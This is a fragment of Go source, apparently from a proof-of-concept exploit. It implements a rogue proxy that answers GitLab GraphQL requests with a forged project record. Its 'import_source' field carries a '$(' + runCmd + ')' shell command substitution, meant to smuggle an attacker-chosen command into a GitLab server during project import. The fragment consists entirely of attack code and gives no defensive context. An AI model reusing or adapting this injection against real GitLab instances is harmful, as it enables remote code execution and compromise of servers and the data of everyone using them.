...
func proxy(w http.ResponseWriter, r *http.Request) {
	...
	if r.Method == "POST" && r.RequestURI == "/api/graphql" {
		...
		if bytes.Contains(bb, []byte(importProjectName)) {
			...
			w.Write(
				[]byte(
					`{"data":{"project":{"description":"Example plain HTML site using GitLab Pages: https://pages.gitlab.io/plain-html",
          "visibility":"public","archived":false,"created_at":"2022-07-29T08:17:46Z","shared_runners_enabled":true,"container_registry_enabled":false,
          "only_allow_merge_if_pipeline_succeeds":false,"only_allow_merge_if_all_discussions_are_resolved":false,"request_access_enabled":false,
          "printing_merge_request_link_enabled":true,"remove_source_branch_after_merge":true,"autoclose_referenced_issues":true,
          "suggestion_commit_message":null,"wiki_enabled":false,"template_name":"plainhtml","import_source":"$(`+runCmd+`)"}}}`,
				),
			)
